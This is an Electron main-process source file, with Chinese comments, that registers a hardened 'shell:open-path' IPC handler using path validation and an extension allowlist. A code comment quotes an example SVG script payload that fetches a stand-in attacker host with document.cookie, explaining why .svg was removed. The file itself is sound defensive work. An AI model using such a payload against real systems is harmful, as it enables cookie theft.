/**
 * Shell 相关 IPC 处理器
 *
 * 暴露给渲染进程的通道（与 src/shared/ipc/channels.ts 保持同步）：
 *   - shell:open-path   调用系统 shell 打开指定路径（文件管理器 / 默认程序）
 */
import { shell } from 'electron'
import { extname, isAbsolute, resolve, sep } from 'node:path'
import { realpath, stat } from 'node:fs/promises'
import { handle } from './channels'
import { settingsRepo } from '../db/repositories/settings'

/** settings 表中 AppSettings 的 key（与 libraryManager.ts 保持一致） */
const SETTINGS_KEY = 'app.settings'

/**
 * 读取当前生效 libraryPath；未配置返回 null
 */
async function getLibraryPath(): Promise<string | null> {
  const all = await settingsRepo.getAll()
  const cfg = (all[SETTINGS_KEY] as Record<string, unknown> | undefined) ?? {}
  return (cfg.libraryPath as string | null | undefined) ?? null
}

/**
 * 路径包含校验：realpath 是否位于 libraryRoot 之内。
 * - 字符串前缀比较必须带 sep，避免 /foo/bar2 被认作 /foo/bar 的子路径。
 * - libraryRoot 为 null（未配置库）时不允许任何目录打开，避免绕过。
 *
 * R-Fix-SHELL_OPEN_PATH-directory-leak (medium info disclosure)：
 * 原版目录分支零约束，被攻陷的渲染端可调
 * `shell:open-path({path: 'C:\\Users\\james\\.ssh'})` 触发系统资源
 * 管理器打开任何可读目录，泄漏目录结构 / 用户注意力。统一收口到
 * libraryPath 子树。
 */
function isInsideDir(real: string, libraryRoot: string | null): boolean {
  if (!libraryRoot) return false
  const normRoot = libraryRoot.endsWith(sep) ? libraryRoot : libraryRoot + sep
  const normReal = real.endsWith(sep) ? real : real + sep
  return normReal === normRoot || normReal.startsWith(normRoot)
}

/** 允许通过 shell.openPath 打开的扩展名（防止被用于执行任意 .bat / .ps1 / .exe） */
const ALLOWED_EXTS = new Set([
  '.md', '.txt', '.json', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.webp',
  '.mp4', '.mov', '.mp3', '.wav',
  // R23 修复 (medium security)：删 .svg。Windows 默认 .svg 关联到 Edge，
  // Edge 会在 SVG 内执行 `<script>` / `onload=`。realpath + extname 二次
  // 校验已堵掉符号链接绕路，但 SVG 文件本体的脚本执行仍会跑（攻击者写
  // 一个含 <script>fetch('//attacker/?'+document.cookie)</script> 的 svg，
  // 用 TaskPilot 自带的"打开附件"路径触达 Edge → 拿到浏览器 cookie）。
  // 如需 SVG 预览，改在 renderer 内用 <img src=> 渲染（同源 + CSP 隔离）。
])

export function registerShellHandlers(): void {
  /**
   * 在系统文件管理器中打开指定路径。
   * 返回字符串时表示失败信息（Electron shell.openPath 的约定），空字符串表示成功。
   *
   * 安全：仅允许常见文档/媒体扩展名；脚本后缀（.bat/.ps1/.sh/.exe）一律拒绝，
   * 防止渲染端被劫持后通过此 IPC 触发任意代码执行。
   */
  handle('shell:open-path', async (_e, args: { path: string }) => {
    if (!args || typeof args.path !== 'string' || !args.path) {
      throw new Error('path is required')
    }
    // R12 修复 (low)：要求绝对路径（防止任意相对路径逃逸），并解析符号
    // 链接 —— 攻击者可能创建 .md 软链接指向 .exe 来绕过扩展名白名单。
    if (!isAbsolute(args.path)) {
      throw new Error('shell:open-path: 仅允许绝对路径')
    }
    let real: string
    try {
      real = await realpath(resolve(args.path))
    } catch {
      throw new Error('shell:open-path: 路径不存在或不可读')
    }
    // 目录路径（库目录、文件夹）：必须落在当前 libraryPath 子树内。
    // R-Fix-SHELL_OPEN_PATH-directory-leak (medium info disclosure)：
    // 原版目录分支零约束，任何可读目录都能被打开；现在统一收口。
    // 设置页「打开库根目录」按钮走的是同样 handler，但 renderer 不应
    // 信任任何外部 path，应由设置页硬编码从 server 读 libraryPath 后再发。
    const s = await stat(real).catch(() => null)
    if (s?.isDirectory()) {
      const libRoot = await getLibraryPath()
      if (!isInsideDir(real, libRoot)) {
        throw new Error(
          'shell:open-path: 目录路径必须在 libraryPath 之内（拒绝越界打开任意目录）',
        )
      }
      return shell.openPath(real)
    }
    // 文件路径：必须命中扩展名白名单（防 .bat / .ps1 / .exe 等任意代码执行）
    const ext = extname(real).toLowerCase()
    if (!ALLOWED_EXTS.has(ext)) {
      throw new Error(`shell:open-path: 不允许的文件类型 '${ext || '(无扩展名)'}'`)
    }
    return shell.openPath(real)
  })
}